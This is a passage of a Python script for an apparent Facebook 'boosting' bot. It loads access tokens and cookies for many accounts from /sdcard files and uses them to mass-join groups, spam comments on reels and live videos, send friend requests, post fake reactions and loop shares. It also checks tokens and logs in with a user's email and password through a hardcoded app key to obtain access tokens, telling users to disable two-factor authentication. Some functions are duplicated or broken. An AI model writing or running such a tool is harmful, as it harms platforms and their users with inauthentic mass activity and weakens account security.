                join_count[0] += 1
            else:
                print(f"{red}FAILED: GROUP ID {group_id}, USER ID {profile_id}{reset}")
                linex()
                failed_count[0] += 1
        else:
            print(f"{red}FAILED: INVALID PROFILE ID FOR TOKEN.{reset}")
            failed_count[0] += 1
    else:
        print(f"{red}FAILED: INVALID PROFILE LINK FOR TOKEN.{reset}")
        failed_count[0] += 1

def auto_group_join(group_id, num_bots):
    access_tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')  
    join_count = [0]
    failed_count = [0]
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        for access_token in access_tokens:
            if join_count[0] >= num_bots:
                break
            if access_token.startswith("EA") or access_token.startswith("EAA"):
                executor.submit(join_group_worker, group_id, access_token, join_count, failed_count)
            else:
                print(f"{red}FAILED: INVALID ACCESS TOKEN FORMAT{reset}")
                failed_count[0] += 1

        executor.shutdown(wait=True)

    print(f"\n{GREEN}SUCCESSFULLY JOINED {join_count[0]} ACCOUNTS TO THE GROUP.{reset}")
    print(f"{red}FAILED TO JOIN {failed_count[0]} ACCOUNTS.{reset}")

def join_groupp():
    clear()
    group_input = input("ENTER THE FACEBOOK GROUP LINK OR ID: ")
    group_id = extract_group_id(group_input)
    num_bots = int(input("ENTER THE NUMBER OF PROFILES TO JOIN: "))
    auto_group_join(group_id, num_bots)


 
def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def perform_comment(media_id, comment_text, access_token):
    try:
        url = f'https://graph.facebook.com/v18.0/{media_id}/comments'
        params = {'access_token': access_token, 'message': comment_text}
        response = requests.post(url, params=params)
        if response.status_code == 200:
            print(f"{GREEN}SUCCESS : COMMENTED '{comment_text}' ON MEDIA ID '{media_id}'.")
            return True
        else:
            error_data = response.json()
            if error_data['error']['code'] == 190 and error_data['error'].get('error_subcode') == 490:
                print(f"{red}CHECKPOINT REQUIRED FOR THIS ACCOUNT. TOKEN: {access_token[:10]}... SKIPPING THIS TOKEN.")
                return False
            else:
                print(f"{red}FAILED TO POST COMMENT ON MEDIA ID '{media_id}'. RESPONSE: {error_data}")
                return False
    except requests.exceptions.RequestException as error:
        print(f"AN ERROR OCCURRED DURING THE REQUEST: {error}")
        return False


def get_ids_tokens(file_path):  
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
        return []
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        return []

def save_valid_data(file_path, valid_data):
    try:
        with open(file_path, 'w') as file:
            for line in valid_data:
                file.write(line + '\n')
    except Exception as e:
        print(f"An error occurred while saving data to {file_path}: {e}")

def check_token_valid(token):
    url = "https://graph.facebook.com/me"
    params = {'access_token': token, 'fields': 'id'}

    try:
        response = requests.get(url, params=params, timeout=5)
        
        if response.status_code == 200:
            print(f"{GREEN}VALID TOKEN: {token}")
            linex()
            return True, None
        else:
            error_message = response.json().get('error', {}).get('message', 'Unknown error')
            if "disabled" in error_message.lower():
                print(f"SUSPENDED/LOCKED ACCOUNT: {token} | REASON: {error_message}")
                return False, "Suspended/Locked Account"
            elif "temporarily locked" in error_message.lower():
                print(f"TEMPORARILY LOCKED ACCOUNT: {token} | REASON: {error_message}")
                return False, "Temporarily Locked Account"
            else:
                print(f"INVALID TOKEN: {token} | REASON: {error_message}")
                return False, error_message
    except requests.RequestException as e:
        print(f"ERROR CHECKING TOKEN: {token} | REASON: {str(e)}")
        return False, str(e)

def validate_and_remove_invalid(ids_file, tokens_file, cok_file, cokid_file):
    ids = get_ids_tokens(ids_file)
    tokens = get_ids_tokens(tokens_file)
    cok = get_ids_tokens(cok_file)
    cokid = get_ids_tokens(cokid_file)

    valid_ids = []
    valid_tokens = []
    valid_cok = []
    valid_cokid = []

    if not ids or not tokens:
        print("Error: No tokens or IDs found. Exiting.")
        return

    for token, actor_id, cok_val, cokid_val in zip(tokens, ids, cok, cokid):
        print(f"CHECKING TOKEN FOR ID: {actor_id}")
        linex()
        is_valid, reason = check_token_valid(token)

        if is_valid:
            valid_ids.append(actor_id)
            valid_tokens.append(token)
            valid_cok.append(cok_val)
            valid_cokid.append(cokid_val)
        else:
            print(f"{RED}REMOVING INVALID TOKEN AND ID: {actor_id} - {token}")
            linex()

    save_valid_data(ids_file, valid_ids)
    save_valid_data(tokens_file, valid_tokens)
    save_valid_data(cok_file, valid_cok)
    save_valid_data(cokid_file, valid_cokid)

def acc_checker():
    ids_file_path = '/sdcard/BOOSTING/tokaid.txt'
    tokens_file_path = '/sdcard/BOOSTING/toka.txt'
    cok_file_path = '/sdcard/BOOSTING/cok.txt'
    cokid_file_path = '/sdcard/BOOSTING/cokid.txt'

    validate_and_remove_invalid(ids_file_path, tokens_file_path, cok_file_path, cokid_file_path)


def remove_duplicates():     
    file_path_tokens = '/sdcard/BOOSTING/toka.txt'
    file_path_actor_ids = '/sdcard/BOOSTING/tokaid.txt'
    file_path_cok = '/sdcard/BOOSTING/cok.txt'
    file_path_cok_ids = '/sdcard/BOOSTING/cokid.txt'

    # Read data from files
    tokens = get_ids_tokens(file_path_tokens)
    actor_ids = get_ids_tokens(file_path_actor_ids)
    cok = get_ids_tokens(file_path_cok)
    cokid = get_ids_tokens(file_path_cok_ids)

    if not tokens and not actor_ids:
        print("No tokens or actor IDs found to remove duplicates.")
        linex()
        return

    # Remove duplicates
    unique_tokens = list(set(tokens))
    unique_actor_ids = list(set(actor_ids))
    unique_cok = list(set(cok))
    unique_cokid = list(set(cokid))

    duplicate_tokens = len(tokens) - len(unique_tokens)
    duplicate_actor_ids = len(actor_ids) - len(unique_actor_ids)
    duplicate_cok = len(cok) - len(unique_cok)
    duplicate_cokid = len(cokid) - len(unique_cokid)

    if duplicate_tokens > 0:
        with open(file_path_tokens, 'w') as file:
            file.writelines([f"{token}\n" for token in unique_tokens])

    if duplicate_actor_ids > 0:
        with open(file_path_actor_ids, 'w') as file:
            file.writelines([f"{actor_id}\n" for actor_id in unique_actor_ids])

    if duplicate_cok > 0:
        with open(file_path_cok, 'w') as file:
            file.writelines([f"{item}\n" for item in unique_cok])

    if duplicate_cokid > 0:
        with open(file_path_cok_ids, 'w') as file:
            file.writelines([f"{item}\n" for item in unique_cokid])
    linex()

    if duplicate_tokens > 0:
        print(f"Duplicates removed from tokens. {duplicate_tokens} duplicate(s) were found and removed.")
    if duplicate_actor_ids > 0:
        print(f"Duplicates removed from actor IDs. {duplicate_actor_ids} duplicate(s) were found and removed.")
    if duplicate_cok > 0:
        print(f"Duplicates removed from cok. {duplicate_cok} duplicate(s) were found and removed.")
    if duplicate_cokid > 0:
        print(f"Duplicates removed from cok IDs. {duplicate_cokid} duplicate(s) were found and removed.")

    if all(count == 0 for count in [duplicate_tokens, duplicate_actor_ids, duplicate_cok, duplicate_cokid]):
        print("No duplicates found.")

    linex()


def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"Error: The file '{file_path}' was not found.")
        return []
    except Exception as e: 
        print(f"An error occurred while reading the file '{file_path}': {e}")
        return []


def git_pull_repository():
    repo_path = 'https://github.com/DuckingDucking/Boosting/upload'

    try:
        print(f"{c}UPDATING THE REPOSITORY...{r}")
        subprocess.run(['git', 'pull'], cwd=repo_path, check=True)
        print(f"{wh}REPOSITORY UPDATED SUCCESSFULLY.{r}")
    except subprocess.CalledProcessError as e:
        print(f"{red}ERROR OCCURRED WHILE UPDATING THE REPOSITORY: {e}{r}")

def extract_reel_id(reels_link):
    match = re.search(r'(?:reel|reels)/(\d+)', reels_link)
    if match:
        return match.group(1)
    else:
        print("INVALID REEL LINK FORMAT!")
        return None

def get_ids_tokens(file_path): 
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def auto_comment_on_reels(reels_link, comment, tokens):
    reel_id = extract_reel_id(reels_link)
    if not reel_id:
        return

    url = f'https://graph.facebook.com/v13.0/{reel_id}/comments'
    total_successful_comments = 0
    total_failed_comments = 0
    token_index = 0
    available_tokens = len(tokens)

    def post_comment():
        nonlocal total_successful_comments, total_failed_comments, token_index

        while token_index < available_tokens:
            current_token = tokens[token_index]

            if current_token.startswith("EA") or current_token.startswith("EAA"):
                params = {'access_token': current_token, 'message': comment}
                try:
                    response = requests.post(url, params=params)

                    if response.status_code == 200:
                        total_successful_comments += 1
                        print(f"COMMENT SUCCESSFULLY POSTED WITH TOKEN {current_token[:10]}... ({total_successful_comments})")
                    else:
                        total_failed_comments += 1
                        error_message = response.json().get("error", {}).get("message", "Unknown error")
                        print(f"FAILED COMMENT WITH TOKEN {current_token[:10]}... STATUS CODE : {response.status_code} - ERROR : {error_message}")

                except requests.exceptions.RequestException as e:
                    print(f"REQUEST FAILED WITH TOKEN {current_token[:10]}... ERROR : {e}")
                    total_failed_comments += 1
            else:
                print(f"INVALID TOKEN FORMAT : {current_token[:10]}...")

            token_index += 1

    threads = []
    for _ in range(min(available_tokens, 10)):
        thread = threading.Thread(target=post_comment)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

    print(f"TOTAL SUCCESSFUL COMMENTS: {total_successful_comments}")
    print(f"TOTAL FAILED COMMENTS: {total_failed_comments}")

def comment_reels():
    reels_link = input("ENTER THE FACEBOOK REEL LINK: ")
    comment = input("ENTER THE COMMENT TEXT: ")

    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')

    if not tokens:
        print("NO TOKENS FOUND. PLEASE ADD TOKENS TO THE FILE.")
        return

    auto_comment_on_reels(reels_link, comment, tokens)

def send_friend_request(profile_url, access_token):
    user_id = extract_user_id_from_url(profile_url)

    if not user_id:
        print(f"Error: Could not extract user ID from URL: {profile_url}")
        return

    url = f'https://graph.facebook.com/v19.0/{user_id}/friends'
    params = {'access_token': access_token}

    try:
        response = requests.post(url, params=params)
        response.raise_for_status()
        response_json = response.json()

        if response.status_code == 200:
            print(f"Friend request sent to user {user_id} ({profile_url}).")
            linex
        else:
            print(f"Error sending friend request to {profile_url}: {response_json.get('error', 'Unknown error')}")
            linex()
    except requests.exceptions.RequestException as e:
        print(f"Error during request to {profile_url}: {e}")

def extract_user_id_from_url(profile_url):
    match = re.search(r'facebook\.com(?:/|%2F)(\d+|[A-Za-z0-9.]+)', profile_url)
    if match:
        return match.group(1)
    else:
        print("Error: Could not extract user ID from the URL.")
        return None

def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
        return []
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        return []

def auto_add_friends():
    clear()
    profile_url = input("Enter the Facebook profile link (URL): ").strip()

    user_id = extract_user_id_from_url(profile_url)

    if not user_id:
        print("Error: Invalid URL or unable to extract user ID. Exiting.")
        return

    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')

    if not tokens:
        print("Error: No valid tokens found. Exiting.")
        return

    try:
        addfriend = int(input("How many friend requests do you want to send: "))
    except ValueError:
        print("Error: Please enter a valid number.")
        return

    if addfriend > len(tokens):
        print(f"Warning: Only {len(tokens)} tokens available, adjusting the number of requests.")
        addfriend = len(tokens)
    for i in range(addfriend): 
        access_token = tokens[i] 
        send_friend_request(profile_url, access_token)

def extract_video_id(video_link):
    try:
        parsed_url = urlparse(video_link)
        if "facebook.com" in parsed_url.netloc:
            query_params = parse_qs(parsed_url.query)
            return query_params.get('v', [None])[0]
        return None
    except Exception as e:
        print(f"{RED}Error extracting video ID: {e}{RESET}")
        return None

def extract_live_id(live_link):
    match = re.search(r"facebook\.com/.+?/videos/(\d+)", live_link)
    if match:
        return match.group(1)
    else:
        return None

def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print("Error: Token file not found.")
        return []

def auto_react_to_live(live_link, reaction, tokens):
    live_id = extract_live_id(live_link)
    if not live_id:
        print("Invalid live video link. Please provide a valid link.")
        return

    url = f"https://graph.facebook.com/v13.0/{live_id}/reactions"

    total_successful_reactions = 0
    total_failed_reactions = 0
    token_index = 0
    available_tokens = len(tokens)

    def post_reaction(token):
        nonlocal total_successful_reactions, total_failed_reactions
        params = {'access_token': token, 'type': reaction}

        try:
            response = requests.post(url, params=params)
            if response.status_code == 200:
                total_successful_reactions += 1
                print(f"{GREEN}Reaction successfully posted with token {token[:10]}... ({total_successful_reactions})")
                linex()
            else:
                total_failed_reactions += 1
                error_message = response.json().get("error", {}).get("message", "Unknown error")
                print(f"{RED}Failed reaction with token {token[:10]}... Status Code: {response.status_code} - Error: {error_message}")
                linex()
        except requests.exceptions.RequestException as e:
            print(f"Request failed with token {token[:10]}... Error: {e}")
            total_failed_reactions += 1

    threads = []
    for token in tokens:
        thread = threading.Thread(target=post_reaction, args=(token,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    linex()
    print(f"{GREEN}Total successful reactions: {total_successful_reactions}")
    linex()
    print(f"{RED}Total failed reactions: {total_failed_reactions}")

def choose_reaction():
    reactions = ["LIKE", "LOVE", "HAHA", "WOW", "SAD", "ANGRY"]
    print(f"{GREEN}Available reactions:")
    linex()
    for i, reaction in enumerate(reactions, 1):
        print(f"{i}. {reaction}")
        
    linex()
    choice = input("Choose a reaction (1-6): ").strip()
    if choice.isdigit() and 1 <= int(choice) <= len(reactions):
        return reactions[int(choice) - 1]
    else:
        print("Invalid choice. Please try again.")
        return None

def react_to_live():
    clear()
    live_link = input("Enter the Facebook Live video link: ").strip()
    linex()
    reaction = choose_reaction()
    linex()
    if not reaction:
        return
    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')
    if not tokens:
        print("No tokens found. Please add tokens to the file.")
        return
    auto_react_to_live(live_link, reaction, tokens)

def extract_live_id(live_link):
    match = re.search(r"facebook\.com/.+?/videos/(\d+)", live_link)
    if match:
        return match.group(1)
    else:
        return None

def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print("Error: Token file not found.")
        return []

def auto_comment_on_live(live_link, comment_text, tokens):
    live_id = extract_live_id(live_link)
    if not live_id:
        print("Invalid live video link. Please provide a valid link.")
        return

    url = f"https://graph.facebook.com/v13.0/{live_id}/comments"

    total_successful_comments = 0
    total_failed_comments = 0

    def post_comment(token):
        nonlocal total_successful_comments, total_failed_comments
        params = {'access_token': token, 'message': comment_text}

        try:
            response = requests.post(url, params=params)
            if response.status_code == 200:
                total_successful_comments += 1
                print(f"{GREEN}Comment successfully posted with token {token[:10]}... ({total_successful_comments})")
            else:
                total_failed_comments += 1
                error_message = response.json().get("error", {}).get("message", "Unknown error")
                print(f"{RED}Failed comment with token {token[:10]}... Status Code: {response.status_code} - Error: {error_message}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed with token {token[:10]}... Error: {e}")
            total_failed_comments += 1

    threads = []
    for token in tokens:
        thread = threading.Thread(target=post_comment, args=(token,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"{GREEN}Total successful comments: {total_successful_comments}")
    print(f"{RED}Total failed comments: {total_failed_comments}")

def comment_on_live():
    live_link = input("Enter the Facebook Live video link: ").strip()
    comment_text = input("Enter the comment text: ").strip()
    linex()

    if not comment_text:
        print("Comment text cannot be empty.")
        return

    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')
    if not tokens:
        print("No tokens found. Please add tokens to the file.")
        return

    auto_comment_on_live(live_link, comment_text, tokens)

def get_ids_tokens(file_path):

    try:

        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"ERROR: File not found at path: {file_path}")
        return []
        import os

import requests
import threading
import time
from datetime import datetime

def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def share_post(token, share_url, shared_count, headers): 
    try:
        response = requests.post(
            f'https://graph.facebook.com/me/feed?access_token={token}&fields=id&limit=1&published=0',
            json={
                'link': share_url,
                'privacy': {'value': 'SELF'},
                'no_story': True,
            },
            headers=headers
        )

        post_id = response.json().get('id')
        shared_count[0] += 1

        print(f'{GREEN}SUCCESSFULLY SHARED ({shared_count[0]}): {post_id or "No ID"}{RESET}')
        linex()

    except requests.exceptions.RequestException as error:
        error_message = error.response.json() if error.response else str(error)
        print(f'{RED}FAILED TO SHARE POST: {error_message}{RESET}')
        linex()

def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"{RED}ERROR: File not found at path: {file_path}{RESET}")
        return []

def spam_sharev2():
    token_file_path = '/sdcard/BOOSTING/toka.txt'
    user_id_file_path = '/sdcard/BOOSTING/tokaid.txt'

    user_ids = get_ids_tokens(user_id_file_path)
    tokens = get_ids_tokens(token_file_path)

    if not user_ids or not tokens:
        print(f"{RED}ERROR: Missing user IDs or access tokens. Check your file paths.{RESET}")
        return

    share_url = input('ENTER THE FACEBOOK POST LINK: ')
    try:
        share_count = int(input('ENTER THE NUMBER OF SHARES: '))
    except ValueError:
        print(f"{RED}ERROR: Invalid number entered.{RESET}")
        return

    shared_count = [0]
    headers = {
        'authority': 'graph.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
    }

    start_time = time.time()

    def thread_worker(token):
        while shared_count[0] < share_count:
            share_post(token, share_url, shared_count, headers)

    threads = []
    for token in tokens:
        if shared_count[0] >= share_count:
            break

        thread = threading.Thread(target=thread_worker, args=(token,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    time_taken = end_time - start_time

    linex()
    print(f'             SHARING COMPLETE')
    linex()
    print(f'☯️ TOTAL SHARED POSTS: {GREEN}{shared_count[0]}{RESET}')
    print(f'🎯 TARGET : {RESET}{share_url[:40]}...')
    print(f'🕛 END TIME: {RESET}{get_current_time()}')
    if time_taken < 60:
        print(f"⌛TIME TAKEN: {time_taken:.2f} seconds")
    elif time_taken < 3600:
        minutes = time_taken // 60
        seconds = time_taken % 60
        print(f"⌛TIME TAKEN: {int(minutes)} minutes and {seconds:.2f} seconds")
    else:
        hours = time_taken // 3600
        minutes = (time_taken % 3600) // 60
        seconds = time_taken % 60
        print(f"⌛TIME TAKEN: {int(hours)} hours, {int(minutes)} minutes, and {seconds:.2f} seconds")
    linex()


def extract_reel_id(reels_link):
    match = re.search(r'/videos/(\d+)', reels_link)
    if match:
        return match.group(1)
    return None

def extract_video_id(video_link):
    return extract_reel_id(video_link)

def choose_reaction():
    reactions = ["LIKE", "LOVE", "HAHA", "WOW", "SAD", "ANGRY"]
    print("Available reactions:", ", ".join(reactions))
    reaction = input("Choose a reaction: ").upper()
    if reaction not in reactions:
        print(f"{RED}Invalid reaction. Please choose from the list.{RESET}")
        return None
    return reaction

def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
        return tokens
    except FileNotFoundError:
        print(f"{RED}File not found: {file_path}{RESET}")
        return []

def auto_react_to_reels(reels_link, reaction, tokens):
    reel_id = extract_reel_id(reels_link)

    if not reel_id:
        print(f"{RED}Invalid reel link. Please provide a valid link.{RESET}")
        return

    url = f'https://graph.facebook.com/v13.0/{reel_id}/reactions'
    total_successful_reactions = 0
    total_failed_reactions = 0
    token_index = 0
    available_tokens = len(tokens)

    def post_reaction():
        nonlocal total_successful_reactions, total_failed_reactions, token_index

        while token_index < available_tokens:
            current_token = tokens[token_index]

            if current_token.startswith("EA") or current_token.startswith("EAA"):
                params = {'access_token': current_token, 'type': reaction}
                try:
                    response = requests.post(url, params=params)

                    if response.status_code == 200:
                        total_successful_reactions += 1
                        print(f"{GREEN}REACTION SUCCESSFULLY POSTED WITH TOKEN {current_token[:10]}... ({total_successful_reactions}){RESET}")
                        linex()
                    else:
                        total_failed_reactions += 1
                        error_message = response.json().get("error", {}).get("message", "Unknown error")
                        print(f"{RED}FAILED REACTION WITH TOKEN {current_token[:10]}... STATUS CODE: {response.status_code} - ERROR: {error_message}{RESET}")
                        linex()

                except requests.exceptions.RequestException as e:
                    print(f"{RED}REQUEST FAILED WITH TOKEN {current_token[:10]}... ERROR: {e}{RESET}")
                    total_failed_reactions += 1
            else:
                print(f"{RED}INVALID TOKEN FORMAT: {current_token[:10]}...{RESET}")

            token_index += 1

    threads = []
    for _ in range(min(available_tokens, 10)):  # Create threads based on available tokens
        thread = threading.Thread(target=post_reaction)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

    print(f"{GREEN}TOTAL SUCCESSFUL REACTIONS: {total_successful_reactions}{RESET}")
    print(f"{RED}TOTAL FAILED REACTIONS: {total_failed_reactions}{RESET}")

def react_on_reels():
    reels_link = input("ENTER THE FACEBOOK REEL LINK OR VIDEO LINK: ")

    # Handle video link format like the provided example
    if "/videos/" in reels_link:
        print(f"{YELLOW}Detected a video link. Processing...{RESET}")
        video_id = extract_video_id(reels_link)
        if video_id:
            reels_link = f"https://www.facebook.com/{video_id}"
        else:
            print(f"{RED}Invalid video link.{RESET}")
            return

    reaction = choose_reaction()
    if not reaction:
        return

    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')

    if not tokens:
        print(f"{RED}NO TOKENS FOUND. PLEASE ADD TOKENS TO THE FILE.{RESET}")
        return

def reset():
    folder_name = "BOOSTING"
    
    if os.path.exists(folder_name):
        shutil.rmtree(folder_name)
        print(f"{c}Successfully Reset.{r}")
    else:
        print(f"{red}Failed to reset. Folder does not exist.{r}")


console = Console()

def TOKEN():
    e = input(f'{RESET} [›] Email/Usn :\033[90m ')
    p = input(f'{RESET} [›] Password  :\033[90m ')
    linex()
    obtain(e, p)
    linex()

def print2(t, d, c):
    console.print(Panel(d, title=t, width=None, padding=(1, 3), style=c))

def obtain(e, p):
    headers = {
        'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',       
        'x-fb-friendly-name': 'Authenticate',
        'x-fb-connection-type': 'Unknown',
        'accept-encoding': 'gzip, deflate',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
    }
    
    data = {
        'adid': ''.join(random.choices(string.hexdigits, k=16)),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'email': e,
        'password': p,
        'generate_analytics_claims': '0',
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_misauth': 'false',
        'generate_session_cookies': '0',
        'generate_machine_id': '0',
        'fb_api_req_friendly_name': 'authenticate',
    }
    
    session = requests.Session()
    session.headers.update(headers)
    
    try:
        response = session.post('https://b-graph.facebook.com/auth/login', data=data)
        submit = response.json()
    except requests.exceptions.RequestException as err:
        print(f'\n{RED} ERROR: {err}{RESET}')
        return

    if 'session_key' in submit:
        print(f'\n{GREEN} SUCCESS: {submit["access_token"]} {RESET}')

    elif 'www.facebook.com' in submit.get('error', {}).get('message', ''):
        print(f'\n{RED} FAILED: ACCOUNT IN CHECKPOINT {RESET}')

    elif 'SMS' in submit.get('error', {}).get('message', ''):
        print(f'\n{RED} FAILED: 2 FACTOR AUTHENTICATION IS ENABLED. PLEASE DISABLE IT BEFORE GETTING TOKEN {RESET}')

    elif submit.get('error', {}).get('error_user_title') == 'Wrong Credentials':
        print(f'\n{RED} FAILED: WRONG CREDENTIALS {RESET}')

    elif submit.get('error', {}).get('error_user_title') == 'Incorrect Username':
        print(f'\n{RED} FAILED: ACCOUNT DOES NOT EXIST {RESET}')

    elif 'limit' in submit.get('error', {}).get('message', ''):
        print(f'\n{RED} FAILED: REQUEST LIMIT. USE VPN OR WAIT {RESET}')

    elif 'required' in submit.get('error', {}).get('message', ''):     
        print(f'\n{RED} FAILED: PLEASE FILL IN ALL REQUIRED FIELDS {RESET}')

    else:
        print(f'\n{RED} ERROR: {submit}{RESET}')


menu()